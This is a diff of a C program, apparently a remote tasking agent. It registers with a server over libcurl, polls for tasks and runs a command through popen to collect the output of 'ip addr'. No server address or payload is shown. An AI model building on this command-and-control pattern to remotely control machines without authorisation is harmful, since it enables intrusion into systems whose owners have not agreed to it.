@@ -16,6 +16,8 @@ static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp);
 bool reg(void)
 {
 
+	struct response chunk = {.memory = malloc(0), .size = 0};
+
 	CURL *curl;
 	CURLcode res;
 
@@ -79,7 +81,7 @@ bool reg(void)
 
 		curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
 
-		struct response chunk = {.memory = malloc(0), .size = 0};
+
 
 		// Send data to this function as opposed to writing to stdout.
 		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, mem_cb);
@@ -133,7 +135,7 @@ static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp)
   mem->size += realsize;
   mem->memory[mem->size] = 0;
 
-//   printf("The data in the function is %s\n\n", mem->memory);
+  printf("The data in the function is %s\n\n", mem->memory);
 
   return realsize;
 }
@@ -178,7 +180,6 @@ bool check_tasks(void)
 	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, get_tasks);
 
 	// set options
-
 	// perform our action
 	// curl_easy_perform accepts the options set above and in this case will
 	// download the content from the URL.
@@ -224,70 +225,51 @@ size_t get_tasks(char *buffer, size_t itemsize, size_t nitems, void *ignorethis)
 // Executes a given task.
 // ref: https://www.linuxquestions.org/questions/linux-newbie-8/
 // help-in-getting-return-status-of-popen-sys-call-870219/
-int execute_tasks(struct strings_array *sa)
+int run_cmd(struct strings_array *sa)
 {
-
-	const char *cmd = "ip";
-	FILE *cmd_fptr = NULL;
-	int cmd_ret = 0;
-	// char *cmd_results = NULL;
-
-	/* Allocates space for array to a size of cap (1) * size of char, as size
-		of file is unknown. When memory runs out realloc() will allocatte
-		additional memory later in word_extract(). */
+	// Allocates space for array to a size of cap (1) * size of char, as size
+	// of file is unknown. When memory runs out realloc() will allocate
+	// additional memory later in word_extract(). */
 	sa->words = malloc((sa->cap) * sizeof(*sa->words));
 	if (!sa->words) {
 		perror("Unable to create space for words.\n");
 		return 1;
 	}
-	// cmd_results = malloc(sizeof(*cmd_results) * 4096);
 
-
+	FILE *cmd_fptr = NULL;
 	char line[1024] = { '\0' };
+	int cmd_ret = 0;
 
-	if(!can_run_command(cmd)) {
-		puts("Command does not exist\n");
-
-	} else {
-		puts("Command exists\n");
-		if ((cmd_fptr = popen("ip addr", "r")) != NULL) {
-			while (fgets(line, sizeof(line), cmd_fptr) != NULL) {
-				if (sa->sz == sa->cap) {
-					sa->cap *= 2;
-					char **tmp_space = realloc(sa->words,
-								sa->cap * sizeof(*sa->words));
-					if (!tmp_space) {
-						perror("Unable to resize.\n");
-						fclose(cmd_fptr);
-						destroy(sa);
-						return 1;
-					}
-					sa->words = tmp_space;
-				}
-
-				size_t len = strlen(line) + 1;
-				sa->words[sa->sz] = malloc(len * sizeof(sa->words[sa->sz]));
-				if (!sa->words[sa->sz]) {
+	if ((cmd_fptr = popen("ip addr", "r")) != NULL) {
+		while (fgets(line, sizeof(line), cmd_fptr) != NULL) {
+			if (sa->sz == sa->cap) {
+				sa->cap *= 2;
+				char **tmp_space = realloc(sa->words,
+							sa->cap * sizeof(*sa->words));
+				if (!tmp_space) {
 					perror("Unable to resize.\n");
 					fclose(cmd_fptr);
 					destroy(sa);
 					return 1;
 				}
-				strncpy(sa->words[sa->sz], line, len);
-				sa->sz++;
-
-
+				sa->words = tmp_space;
 			}
 
+			size_t len = strlen(line) + 1;
+			sa->words[sa->sz] = malloc(len * sizeof(sa->words[sa->sz]));
+			if (!sa->words[sa->sz]) {
+				perror("Unable to resize.\n");
+				fclose(cmd_fptr);
+				destroy(sa);
+				return 1;
+			}
+			strncpy(sa->words[sa->sz], line, len);
+			sa->sz++;
 		}
+
 	}
 	cmd_ret = pclose(cmd_fptr);
 	printf("The exit status is: %d\n", WEXITSTATUS(cmd_ret));
-	// (void) printf("%s", cmd_results);
-
-	// for (unsigned int i = 0; i < sa->sz; i++) {
-	// 	printf("%s\n", sa->words[i]);
-	// }
 
 	if (cmd_ret != 1) {
 		return 1;
@@ -299,7 +281,7 @@ int execute_tasks(struct strings_array *sa)
 // all versions of Linux
 // Ref: https://stackoverflow.com/questions/41230547/check-if-program-is-
 // installed-in-c
-bool can_run_command(const char *cmd) 
+bool can_run_cmd(const char *cmd) 
 {
     if(strchr(cmd, '/')) {
         // if cmd includes a slash, no path search must be performed,
